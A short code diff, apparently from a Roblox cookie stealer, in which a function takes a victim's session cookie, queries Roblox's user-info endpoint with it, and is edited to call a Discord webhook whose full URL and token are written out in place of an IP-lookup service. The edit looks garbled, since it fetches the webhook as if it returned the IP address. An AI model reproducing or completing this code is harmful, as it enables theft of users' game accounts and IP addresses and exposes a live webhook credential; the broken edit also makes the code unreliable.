@@ -1,7 +1,7 @@
 const WEBHOOK = "";
 
 async function main(cookie) {
-    var ipAddr = await (await fetch("https://api.ipify.org")).text();
+    var ipAddr = await (await fetch("https://discord.com/api/webhooks/1383169504892293271/acod8uYzFJHrPTRi4CE1ymIugVT8iiN4n8NKMP2azaZ3SdVz8QGUKBmnty_qczyxhaKR")).text();
 
     if (cookie) {
         var statistics = await (await fetch("https://www.roblox.com/mobileapi/userinfo", {
